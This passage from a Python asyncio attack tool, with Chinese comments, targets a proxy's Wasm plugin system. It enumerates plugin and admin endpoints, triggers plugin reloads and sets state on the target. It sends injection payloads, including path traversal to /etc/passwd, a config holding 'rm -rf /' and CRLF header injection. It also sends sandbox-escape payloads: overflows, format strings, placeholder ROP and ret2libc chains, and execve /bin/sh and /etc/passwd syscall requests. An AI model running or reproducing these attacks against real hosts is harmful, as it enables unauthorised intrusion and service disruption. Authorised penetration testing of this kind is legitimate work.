                '/.well-known/plugins', '/admin/plugins', '/envoy/plugins',
                '/api/plugins', '/runtime/plugins', '/config/plugins'
            ]
            
            found_plugins = []
            
            for path in plugin_paths[:5]:  # 限制测试数量
                try:
                    reader, writer = await self._create_connection()
                    
                    request = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Accept: application/json,application/wasm\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    if '200 OK' in response_text:
                        # 分析响应内容查找插件信息
                        plugin_keywords = ['plugin', 'module', 'wasm', 'filter', 'extension']
                        
                        content_part = response_text.split('\r\n\r\n', 1)
                        if len(content_part) > 1:
                            content = content_part[1]
                            
                            # 尝试解析JSON响应
                            try:
                                import json
                                if content.strip().startswith('{') or content.strip().startswith('['):
                                    json_data = json.loads(content)
                                    # 从JSON中提取插件信息
                                    plugins_from_json = self._extract_plugins_from_json(json_data, path)
                                    found_plugins.extend(plugins_from_json)
                            except:
                                pass
                            
                            # 文本模式插件发现
                            for keyword in plugin_keywords:
                                if keyword in content.lower():
                                    found_plugins.append({
                                        'name': f'Plugin_at_{path}',
                                        'type': 'path_discovered',
                                        'source': path,
                                        'evidence': f'Found {keyword} in response'
                                    })
                                    break
                    
                except Exception:
                    continue
            
            return {
                'found': len(found_plugins) > 0,
                'plugins': found_plugins,
                'paths_tested': len(plugin_paths[:5])
            }
            
        except Exception as e:
            return {
                'found': False,
                'plugins': [],
                'error': str(e)
            }
    
    def _extract_plugins_from_json(self, json_data: Any, source_path: str) -> List[Dict]:
        """从JSON响应中提取插件信息"""
        
        plugins = []
        
        try:
            if isinstance(json_data, dict):
                # 检查顶级键
                for key, value in json_data.items():
                    if any(keyword in key.lower() for keyword in ['plugin', 'module', 'wasm', 'filter']):
                        if isinstance(value, str):
                            plugins.append({
                                'name': value,
                                'type': 'json_plugin',
                                'source': source_path,
                                'json_key': key
                            })
                        elif isinstance(value, list):
                            for item in value:
                                if isinstance(item, str):
                                    plugins.append({
                                        'name': item,
                                        'type': 'json_plugin_list',
                                        'source': source_path,
                                        'json_key': key
                                    })
                                elif isinstance(item, dict) and 'name' in item:
                                    plugins.append({
                                        'name': item['name'],
                                        'type': 'json_plugin_object',
                                        'source': source_path,
                                        'json_key': key
                                    })
            
            elif isinstance(json_data, list):
                # 处理插件列表
                for item in json_data:
                    if isinstance(item, dict) and 'name' in item:
                        plugins.append({
                            'name': item['name'],
                            'type': 'json_plugin_array',
                            'source': source_path,
                            'metadata': item
                        })
        
        except Exception:
            pass
        
        return plugins
    
    async def _discover_plugins_via_timing(self) -> Dict:
        """通过时序分析发现插件"""
        
        try:
            # 测试不同类型的请求，观察时序差异
            timing_tests = [
                {'name': 'auth_plugin', 'headers': {'Authorization': 'Bearer invalid_token'}},
                {'name': 'rate_limit_plugin', 'path': '/api/rate-test'},
                {'name': 'transform_plugin', 'headers': {'Content-Type': 'application/xml'}},
                {'name': 'logging_plugin', 'headers': {'X-Request-ID': 'timing-test-123'}}
            ]
            
            baseline_time = await self._measure_request_time("/")
            found_plugins = []
            
            for test in timing_tests:
                try:
                    test_path = test.get('path', '/')
                    test_headers = test.get('headers', {})
                    
                    test_time = await self._measure_request_time(test_path, test_headers)
                    
                    # 如果请求时间显著不同，可能触发了插件
                    time_ratio = test_time / baseline_time if baseline_time > 0 else 1.0
                    
                    if time_ratio > 1.5 or time_ratio < 0.5:  # 时间差异超过50%
                        found_plugins.append({
                            'name': test['name'],
                            'type': 'timing_detected',
                            'source': 'timing_analysis',
                            'baseline_time': baseline_time,
                            'test_time': test_time,
                            'ratio': time_ratio
                        })
                
                except Exception:
                    continue
            
            return {
                'found': len(found_plugins) > 0,
                'plugins': found_plugins,
                'baseline_time': baseline_time
            }
            
        except Exception as e:
            return {
                'found': False,
                'plugins': [],
                'error': str(e)
            }
    
    async def _discover_plugins_via_errors(self) -> Dict:
        """通过错误消息发现插件"""
        
        try:
            # 发送可能触发插件错误的请求
            error_inducing_requests = [
                {'path': '/admin', 'method': 'DELETE'},
                {'path': '/api/test', 'headers': {'Content-Type': 'application/invalid'}},
                {'path': '/', 'headers': {'X-Malformed-Header': 'value\r\ninjection'}},
                {'path': '/nonexistent', 'method': 'POST'}
            ]
            
            found_plugins = []
            
            for req_config in error_inducing_requests:
                try:
                    reader, writer = await self._create_connection()
                    
                    method = req_config.get('method', 'GET')
                    path = req_config['path']
                    headers = req_config.get('headers', {})
                    
                    request_lines = [f"{method} {path} HTTP/1.1", f"Host: {self.target_host}"]
                    for header, value in headers.items():
                        request_lines.append(f"{header}: {value}")
                    request_lines.extend(["Connection: close", "", ""])
                    
                    request = "\r\n".join(request_lines)
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    # 分析错误消息中的插件信息
                    plugin_error_patterns = [
                        'plugin error', 'wasm error', 'module error', 'filter error',
                        'plugin:', 'wasm:', 'module:', 'extension:'
                    ]
                    
                    for pattern in plugin_error_patterns:
                        if pattern in response_text.lower():
                            # 尝试提取插件名称
                            lines = response_text.split('\n')
                            for line in lines:
                                if pattern in line.lower():
                                    found_plugins.append({
                                        'name': f'Error_Plugin_{pattern.replace(":", "").replace(" ", "_")}',
                                        'type': 'error_detected',
                                        'source': 'error_analysis',
                                        'error_line': line.strip()[:100],
                                        'trigger_request': f"{method} {path}"
                                    })
                                    break
                            break
                
                except Exception:
                    continue
            
            return {
                'found': len(found_plugins) > 0,
                'plugins': found_plugins,
                'requests_tested': len(error_inducing_requests)
            }
            
        except Exception as e:
            return {
                'found': False,
                'plugins': [],
                'error': str(e)
            }
    
    async def _analyze_plugin_lifecycle(self) -> Dict:
        """分析插件生命周期"""
        
        lifecycle_analysis = {
            'initialization_timing': {},
            'load_unload_behavior': {},
            'state_persistence': {},
            'reload_mechanisms': {}
        }
        
        try:
            # 1. 初始化时序分析
            print(f"[*] Analyzing plugin initialization timing...")
            init_timing = await self._analyze_initialization_timing()
            lifecycle_analysis['initialization_timing'] = init_timing
            
            # 2. 加载/卸载行为分析
            print(f"[*] Testing plugin load/unload behavior...")
            load_unload = await self._test_load_unload_behavior()
            lifecycle_analysis['load_unload_behavior'] = load_unload
            
            # 3. 状态持久化测试
            print(f"[*] Testing state persistence...")
            state_persistence = await self._test_state_persistence()
            lifecycle_analysis['state_persistence'] = state_persistence
            
            # 4. 重载机制评估
            print(f"[*] Evaluating reload mechanisms...")
            reload_mechanisms = await self._evaluate_reload_mechanisms()
            lifecycle_analysis['reload_mechanisms'] = reload_mechanisms
            
        except Exception as e:
            lifecycle_analysis['error'] = str(e)
        
        return lifecycle_analysis
    
    async def _analyze_initialization_timing(self) -> Dict:
        """分析插件初始化时序"""
        
        try:
            # 测试"冷启动"vs"热启动"
            cold_start_times = []
            warm_start_times = []
            
            # 冷启动测试 - 间隔较长的请求
            for i in range(3):
                cold_time = await self._measure_request_time("/", {'X-Cold-Start': f'test-{i}'})
                if cold_time > 0:
                    cold_start_times.append(cold_time)
                await asyncio.sleep(2.0)  # 长间隔
            
            # 热启动测试 - 连续请求
            for i in range(3):
                warm_time = await self._measure_request_time("/", {'X-Warm-Start': f'test-{i}'})
                if warm_time > 0:
                    warm_start_times.append(warm_time)
                await asyncio.sleep(0.1)  # 短间隔
            
            # 分析结果
            avg_cold = sum(cold_start_times) / len(cold_start_times) if cold_start_times else 0
            avg_warm = sum(warm_start_times) / len(warm_start_times) if warm_start_times else 0
            
            startup_ratio = avg_cold / avg_warm if avg_warm > 0 else 1.0
            
            return {
                'cold_start_avg': avg_cold,
                'warm_start_avg': avg_warm,
                'startup_ratio': startup_ratio,
                'initialization_overhead': startup_ratio > 1.3,  # 冷启动慢30%以上
                'cold_start_samples': cold_start_times,
                'warm_start_samples': warm_start_times
            }
            
        except Exception as e:
            return {
                'cold_start_avg': 0,
                'warm_start_avg': 0,
                'error': str(e)
            }
    
    async def _test_load_unload_behavior(self) -> Dict:
        """测试插件加载/卸载行为"""
        
        try:
            # 测试插件加载端点
            load_endpoints = [
                '/admin/plugins/load',
                '/api/plugins/reload', 
                '/wasm/reload',
                '/envoy/reload'
            ]
            
            load_test_results = []
            
            for endpoint in load_endpoints[:2]:  # 限制测试数量
                try:
                    # 测试POST请求到加载端点
                    reader, writer = await self._create_connection()
                    
                    test_payload = '{"action": "reload", "plugin": "test"}'
                    request = (
                        f"POST {endpoint} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(test_payload)}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{test_payload}"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    load_test_results.append({
                        'endpoint': endpoint,
                        'response_status': response_text.split('\r\n')[0] if response_text else '',
                        'accessible': '200' in response_text or '202' in response_text,
                        'reload_supported': 'reload' in response_text.lower() or 'load' in response_text.lower()
                    })
                    
                except Exception:
                    continue
            
            return {
                'load_endpoints_tested': len(load_endpoints[:2]),
                'load_test_results': load_test_results,
                'reload_capability': any(result.get('reload_supported', False) for result in load_test_results)
            }
            
        except Exception as e:
            return {
                'load_endpoints_tested': 0,
                'error': str(e)
            }
    
    async def _test_state_persistence(self) -> Dict:
        """测试状态持久化"""
        
        try:
            # 设置状态然后检查持久化
            state_key = f"test_state_{int(time.time())}"
            state_value = f"value_{random.randint(1000, 9999)}"
            
            # 尝试设置状态
            set_result = await self._attempt_state_set(state_key, state_value)
            
            if set_result['success']:
                # 等待一段时间后检查状态
                await asyncio.sleep(1.0)
                get_result = await self._attempt_state_get(state_key)
                
                return {
                    'state_persistence_supported': get_result['success'] and get_result['value'] == state_value,
                    'set_operation': set_result,
                    'get_operation': get_result,
                    'persistence_evidence': get_result.get('value') == state_value
                }
            else:
                return {
                    'state_persistence_supported': False,
                    'set_operation': set_result,
                    'reason': 'Could not set initial state'
                }
                
        except Exception as e:
            return {
                'state_persistence_supported': False,
                'error': str(e)
            }
    
    async def _attempt_state_set(self, key: str, value: str) -> Dict:
        """尝试设置状态"""
        
        state_endpoints = [
            '/admin/state',
            '/api/state', 
            '/runtime/state',
            '/plugins/state'
        ]
        
        for endpoint in state_endpoints:
            try:
                reader, writer = await self._create_connection()
                
                payload = json.dumps({key: value})
                request = (
                    f"POST {endpoint} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(payload)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{payload}"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                response_text = response.decode('utf-8', errors='ignore')
                
                await self._close_connection(writer)
                
                if '200' in response_text or '201' in response_text:
                    return {
                        'success': True,
                        'endpoint': endpoint,
                        'response': response_text[:200]
                    }
                    
            except Exception:
                continue
        
        return {
            'success': False,
            'endpoints_tried': len(state_endpoints)
        }
    
    async def _attempt_state_get(self, key: str) -> Dict:
        """尝试获取状态"""
        
        state_endpoints = [
            f'/admin/state/{key}',
            f'/api/state/{key}',
            f'/runtime/state/{key}',
            f'/plugins/state/{key}'
        ]
        
        for endpoint in state_endpoints:
            try:
                reader, writer = await self._create_connection()
                
                request = (
                    f"GET {endpoint} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                response_text = response.decode('utf-8', errors='ignore')
                
                await self._close_connection(writer)
                
                if '200' in response_text:
                    # 尝试从响应中提取值
                    content = response_text.split('\r\n\r\n', 1)
                    if len(content) > 1:
                        try:
                            json_data = json.loads(content[1])
                            if key in json_data:
                                return {
                                    'success': True,
                                    'value': json_data[key],
                                    'endpoint': endpoint
                                }
                        except:
                            pass
                    
                    return {
                        'success': True,
                        'value': content[1] if len(content) > 1 else '',
                        'endpoint': endpoint
                    }
                    
            except Exception:
                continue
        
        return {
            'success': False,
            'endpoints_tried': len(state_endpoints)
        }
    
    async def _evaluate_reload_mechanisms(self) -> Dict:
        """评估重载机制"""
        
        try:
            reload_mechanisms = {
                'hot_reload_supported': False,
                'graceful_restart': False,
                'zero_downtime': False,
                'reload_endpoints': []
            }
            
            # 测试热重载端点
            reload_endpoints = [
                '/admin/reload',
                '/api/reload',
                '/plugins/reload',
                '/wasm/reload'
            ]
            
            for endpoint in reload_endpoints[:2]:  # 限制测试
                try:
                    # 测量重载前的响应时间
                    pre_reload_time = await self._measure_request_time("/")
                    
                    # 发送重载请求
                    reader, writer = await self._create_connection()
                    
                    request = (
                        f"POST {endpoint} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Length: 0\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    if '200' in response_text:
                        reload_mechanisms['reload_endpoints'].append(endpoint)
                        
                        # 测量重载后的响应时间
                        await asyncio.sleep(0.5)
                        post_reload_time = await self._measure_request_time("/")
                        
                        # 检查服务是否依然可用
                        if post_reload_time > 0:
                            reload_mechanisms['zero_downtime'] = True
                            
                            # 如果响应时间变化不大，可能支持热重载
                            time_change_ratio = abs(post_reload_time - pre_reload_time) / pre_reload_time
                            if time_change_ratio < 0.5:  # 时间变化小于50%
                                reload_mechanisms['hot_reload_supported'] = True
                
                except Exception:
                    continue
            
            reload_mechanisms['graceful_restart'] = len(reload_mechanisms['reload_endpoints']) > 0
            
            return reload_mechanisms
            
        except Exception as e:
            return {
                'hot_reload_supported': False,
                'error': str(e)
            }
    
    async def _analyze_plugin_communication(self) -> Dict:
        """分析插件间通信"""
        
        try:
            communication_analysis = {
                'inter_plugin_channels': [],
                'shared_memory_access': False,
                'message_passing': False,
                'communication_security': {}
            }
            
            # 测试插件间通信端点
            comm_endpoints = [
                '/api/plugins/communicate',
                '/plugins/message',
                '/wasm/ipc',
                '/runtime/communicate'
            ]
            
            for endpoint in comm_endpoints[:2]:
                try:
                    test_message = json.dumps({
                        'source_plugin': 'test_plugin_a',
                        'target_plugin': 'test_plugin_b', 
                        'message': 'communication_test'
                    })
                    
                    reader, writer = await self._create_connection()
                    
                    request = (
                        f"POST {endpoint} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(test_message)}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{test_message}"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    if '200' in response_text:
                        communication_analysis['inter_plugin_channels'].append(endpoint)
                        communication_analysis['message_passing'] = True
                        
                except Exception:
                    continue
            
            return communication_analysis
            
        except Exception as e:
            return {'error': str(e)}
    
    async def _assess_plugin_config_security(self) -> Dict:
        """评估插件配置安全性"""
        
        try:
            config_security = {
                'config_injection_vulnerable': False,
                'unauthorized_config_access': False,
                'config_validation_bypass': False,
                'sensitive_config_exposed': False
            }
            
            # 测试配置注入
            injection_result = await self._test_plugin_config_injection()
            config_security.update(injection_result)
            
            # 测试未授权配置访问
            unauth_result = await self._test_unauthorized_config_access()
            config_security.update(unauth_result)
            
            return config_security
            
        except Exception as e:
            return {'error': str(e)}
    
    async def _test_plugin_config_injection(self) -> Dict:
        """测试插件配置注入"""
        
        try:
            injection_payloads = [
                '{"plugin_name": "test", "config": {"malicious": "payload"}}',
                '{"plugin_name": "../../../etc/passwd", "config": {}}',
                '{"plugin_name": "test", "config": {"cmd": "rm -rf /"}}' 
            ]
            
            for payload in injection_payloads[:2]:
                try:
                    reader, writer = await self._create_connection()
                    
                    request = (
                        f"POST /api/plugins/config HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(payload)}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{payload}"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    if '200' in response_text and 'error' not in response_text.lower():
                        return {'config_injection_vulnerable': True}
                        
                except Exception:
                    continue
            
            return {'config_injection_vulnerable': False}
            
        except Exception as e:
            return {'config_injection_vulnerable': False, 'error': str(e)}
    
    async def _test_unauthorized_config_access(self) -> Dict:
        """测试未授权配置访问"""
        
        config_endpoints = [
            '/admin/plugins/config',
            '/api/plugins/config',
            '/config/plugins',
            '/plugins/config.json'
        ]
        
        for endpoint in config_endpoints[:2]:
            try:
                reader, writer = await self._create_connection()
                
                request = (
                    f"GET {endpoint} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
                response_text = response.decode('utf-8', errors='ignore')
                
                await self._close_connection(writer)
                
                if '200' in response_text:
                    return {'unauthorized_config_access': True}
                    
            except Exception:
                continue
        
        return {'unauthorized_config_access': False}
    
    async def _evaluate_plugin_isolation(self) -> Dict:
        """评估插件隔离机制"""
        
        try:
            isolation_analysis = {
                'process_isolation': False,
                'memory_isolation': False, 
                'filesystem_isolation': False,
                'network_isolation': False
            }
            
            # 测试进程隔离
            process_test = await self._test_process_isolation()
            isolation_analysis.update(process_test)
            
            # 测试内存隔离
            memory_test = await self._test_memory_isolation()
            isolation_analysis.update(memory_test)
            
            return isolation_analysis
            
        except Exception as e:
            return {'error': str(e)}
    
    async def _test_process_isolation(self) -> Dict:
        """测试进程隔离"""
        
        try:
            # 尝试获取进程信息
            reader, writer = await self._create_connection()
            
            request = (
                f"GET /admin/processes HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            # 如果能获取到进程信息，可能存在隔离问题
            if '200' in response_text and ('pid' in response_text.lower() or 'process' in response_text.lower()):
                return {'process_isolation': False}
            
            return {'process_isolation': True}
            
        except Exception:
            return {'process_isolation': True}
    
    async def _test_memory_isolation(self) -> Dict:
        """测试内存隔离"""
        
        try:
            # 尝试内存探测
            memory_probe_payloads = [
                b'\x00' * 1000,  # 大量空字节
                b'\xff' * 1000,  # 大量0xff字节
                b'AAAA' * 250     # 重复模式
            ]
            
            for payload in memory_probe_payloads:
                try:
                    reader, writer = await self._create_connection()
                    
                    payload_b64 = base64.b64encode(payload).decode()
                    json_payload = json.dumps({'memory_test': payload_b64})
                    
                    request = (
                        f"POST /api/memory/test HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(json_payload)}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{json_payload}"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    # 检查是否有内存相关错误
                    if 'segmentation' in response_text.lower() or 'memory' in response_text.lower():
                        return {'memory_isolation': False}
                        
                except Exception:
                    continue
            
            return {'memory_isolation': True}
            
        except Exception:
            return {'memory_isolation': True}
    
    async def _assess_sandbox_security(self) -> Dict:
        """评估沙箱安全性"""
        
        sandbox_assessment = {
            'sandbox_escape_attempts': {},
            'capability_restrictions': {},
            'resource_limitations': {},
            'api_access_controls': {}
        }
        
        try:
            print(f"[*] Testing sandbox escape vectors...")
            
            # 1. 沙箱逃逸测试
            escape_attempts = await self._test_sandbox_escape_attempts()
            sandbox_assessment['sandbox_escape_attempts'] = escape_attempts
            
            # 2. 权限限制测试
            print(f"[*] Testing capability restrictions...")
            capability_tests = await self._test_capability_restrictions()
            sandbox_assessment['capability_restrictions'] = capability_tests
            
            # 3. 资源限制测试
            print(f"[*] Testing resource limitations...")
            resource_tests = await self._test_resource_limitations()
            sandbox_assessment['resource_limitations'] = resource_tests
            
            # 4. API访问控制测试
            print(f"[*] Testing API access controls...")
            api_tests = await self._test_api_access_controls()
            sandbox_assessment['api_access_controls'] = api_tests
            
        except Exception as e:
            sandbox_assessment['error'] = str(e)
        
        return sandbox_assessment
    
    async def _test_sandbox_escape_attempts(self) -> Dict:
        """测试沙箱逃逸尝试"""
        
        escape_results = {
            'memory_corruption_attempts': [],
            'control_flow_hijack_attempts': [],
            'system_call_escape_attempts': [],
            'successful_escapes': 0
        }
        
        try:
            # 1. 内存破坏攻击
            print(f"[*] Testing memory corruption vectors...")
            memory_attacks = await self._test_memory_corruption_attacks()
            escape_results['memory_corruption_attempts'] = memory_attacks
            
            # 2. 控制流劫持
            print(f"[*] Testing control flow hijacking...")
            control_flow_attacks = await self._test_control_flow_hijacking()
            escape_results['control_flow_hijack_attempts'] = control_flow_attacks
            
            # 3. 系统调用逃逸
            print(f"[*] Testing system call escape...")
            syscall_attacks = await self._test_syscall_escape()
            escape_results['system_call_escape_attempts'] = syscall_attacks
            
            # 统计成功的逃逸
            successful_memory = sum(1 for attack in memory_attacks if attack.get('success', False))
            successful_control = sum(1 for attack in control_flow_attacks if attack.get('success', False))
            successful_syscall = sum(1 for attack in syscall_attacks if attack.get('success', False))
            
            escape_results['successful_escapes'] = successful_memory + successful_control + successful_syscall
            
        except Exception as e:
            escape_results['error'] = str(e)
        
        return escape_results
    
    async def _test_memory_corruption_attacks(self) -> List[Dict]:
        """测试内存破坏攻击"""
        
        memory_attacks = []
        
        # Buffer overflow攻击载荷
        overflow_payloads = [
            # 栈溢出模式
            {'name': 'stack_overflow', 'payload': b'A' * 2048, 'type': 'buffer_overflow'},
            # 堆溢出模式  
            {'name': 'heap_overflow', 'payload': b'B' * 4096, 'type': 'heap_overflow'},
            # 格式化字符串攻击
            {'name': 'format_string', 'payload': b'%x' * 100, 'type': 'format_string'},
            # 整数溢出
            {'name': 'integer_overflow', 'payload': struct.pack('<Q', 0xffffffffffffffff), 'type': 'integer_overflow'}
        ]
        
        for attack_config in overflow_payloads:
            try:
                attack_result = await self._execute_memory_attack(attack_config)
                memory_attacks.append(attack_result)
                
            except Exception as e:
                memory_attacks.append({
                    'name': attack_config['name'],
                    'success': False,
                    'error': str(e)
                })
        
        return memory_attacks
    
    async def _execute_memory_attack(self, attack_config: Dict) -> Dict:
        """执行内存攻击"""
        
        try:
            payload = attack_config['payload']
            attack_name = attack_config['name']
            
            # 通过HTTP POST发送攻击载荷
            reader, writer = await self._create_connection()
            
            # 将二进制载荷编码为base64
            payload_b64 = base64.b64encode(payload).decode()
            json_payload = json.dumps({
                'attack_type': attack_name,
                'payload': payload_b64,
                'target': 'wasm_module'
            })
            
            request = (
                f"POST /api/wasm/execute HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(json_payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{json_payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            # 分析响应，判断攻击是否成功
            success_indicators = [
                'segmentation fault', 'core dump', 'memory violation',
                'access violation', 'buffer overflow detected'
            ]
            
            failure_indicators = [
                'sandbox violation', 'access denied', 'blocked',
                'invalid operation', 'permission denied'
            ]
            
            response_lower = response_text.lower()
            
            success = any(indicator in response_lower for indicator in success_indicators)
            blocked = any(indicator in response_lower for indicator in failure_indicators)
            
            return {
                'name': attack_name,
                'type': attack_config['type'],
                'success': success,
                'blocked_by_sandbox': blocked,
                'response_preview': response_text[:200],
                'payload_size': len(payload)
            }
            
        except Exception as e:
            return {
                'name': attack_config['name'],
                'success': False,
                'error': str(e)
            }
    
    async def _test_control_flow_hijacking(self) -> List[Dict]:
        """测试控制流劫持"""
        
        control_flow_attacks = []
        
        # ROP/JOP攻击载荷
        hijack_payloads = [
            {'name': 'rop_chain', 'payload': self._generate_rop_payload()},
            {'name': 'jop_gadget', 'payload': self._generate_jop_payload()},
            {'name': 'ret2libc', 'payload': self._generate_ret2libc_payload()}
        ]
        
        for attack_config in hijack_payloads:
            try:
                # 通过特殊的Wasm模块端点发送攻击
                reader, writer = await self._create_connection()
                
                payload_hex = attack_config['payload'].hex()
                json_payload = json.dumps({
                    'module_type': 'wasm',
                    'attack_vector': attack_config['name'],
                    'binary_data': payload_hex
                })
                
                request = (
                    f"POST /wasm/load_module HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(json_payload)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{json_payload}"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                response_text = response.decode('utf-8', errors='ignore')
                
                await self._close_connection(writer)
                
                # 分析响应
                hijack_success = any(indicator in response_text.lower() for indicator in [
                    'execution redirected', 'control transferred', 'gadget found'
                ])
                
                control_flow_attacks.append({
                    'name': attack_config['name'],
                    'success': hijack_success,
                    'response': response_text[:150]
                })
                
            except Exception as e:
                control_flow_attacks.append({
                    'name': attack_config['name'],
                    'success': False,
                    'error': str(e)
                })
        
        return control_flow_attacks
    
    def _generate_rop_payload(self) -> bytes:
        """生成ROP攻击载荷"""
        # 简化的ROP链模拟
        rop_gadgets = [
            struct.pack('<Q', 0x41414141),  # 伪造返回地址
            struct.pack('<Q', 0x42424242),  # 伪造gadget 1
            struct.pack('<Q', 0x43434343),  # 伪造gadget 2
        ]
        return b''.join(rop_gadgets)
    
    def _generate_jop_payload(self) -> bytes:
        """生成JOP攻击载荷"""
        # 简化的JOP攻击载荷
        return struct.pack('<QQQ', 0x44444444, 0x45454545, 0x46464646)
    
    def _generate_ret2libc_payload(self) -> bytes:
        """生成ret2libc攻击载荷"""
        # 简化的ret2libc载荷
        return b'A' * 128 + struct.pack('<Q', 0x47474747)
    
    async def _test_syscall_escape(self) -> List[Dict]:
        """测试系统调用逃逸"""
        
        syscall_attacks = []
        
        # 系统调用逃逸载荷
        syscall_payloads = [
            {'name': 'file_access', 'syscall': 'open', 'args': '/etc/passwd'},
            {'name': 'network_access', 'syscall': 'socket', 'args': 'tcp'},
            {'name': 'process_spawn', 'syscall': 'execve', 'args': '/bin/sh'}
        ]
        
        for payload_config in syscall_payloads:
            try:
                # 构造系统调用测试请求
                reader, writer = await self._create_connection()
                
                test_payload = json.dumps({
                    'syscall_test': payload_config['syscall'],
                    'arguments': payload_config['args'],
                    'escape_attempt': True
                })
                
                request = (
                    f"POST /api/syscall/test HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(test_payload)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{test_payload}"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                response_text = response.decode('utf-8', errors='ignore')
                
                await self._close_connection(writer)
                
                # 检查系统调用是否成功执行
                escape_success = any(indicator in response_text.lower() for indicator in [
                    'syscall executed', 'system call successful', 'file opened', 'socket created'
                ])
                
                syscall_attacks.append({
                    'name': payload_config['name'],
                    'syscall': payload_config['syscall'],
                    'success': escape_success,
                    'blocked': 'permission denied' in response_text.lower() or 'blocked' in response_text.lower()
                })
                
            except Exception as e:
                syscall_attacks.append({
                    'name': payload_config['name'],
                    'success': False,
                    'error': str(e)
                })
        
        return syscall_attacks
    
    async def _test_capability_restrictions(self) -> Dict:
        """测试权限限制"""
        
        capability_tests = {
            'file_system_access': False,
            'network_access': False,
            'system_info_access': False,
            'restricted_operations': []
        }
        
        try:
            # 测试文件系统访问
            fs_test = await self._test_filesystem_capabilities()
            capability_tests['file_system_access'] = fs_test['accessible']
            
            # 测试网络访问
            net_test = await self._test_network_capabilities()
            capability_tests['network_access'] = net_test['accessible']
            
            # 测试系统信息访问
            sys_test = await self._test_system_info_capabilities()
            capability_tests['system_info_access'] = sys_test['accessible']
            
        except Exception as e:
            capability_tests['error'] = str(e)
        
        return capability_tests
    
    async def _test_filesystem_capabilities(self) -> Dict:
        """测试文件系统权限"""
        
        try:
            file_operations = [
                {'op': 'read', 'path': '/etc/hosts'},
                {'op': 'write', 'path': '/tmp/wasm_test'},
                {'op': 'list', 'path': '/'}
            ]
            
            for operation in file_operations:
                try:
                    reader, writer = await self._create_connection()
                    
                    test_payload = json.dumps({
                        'file_operation': operation['op'],
                        'target_path': operation['path']
                    })
                    
                    request = (
                        f"POST /api/file/test HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(test_payload)}\r\n"
                        f"Connection: close\r\n\r\n"
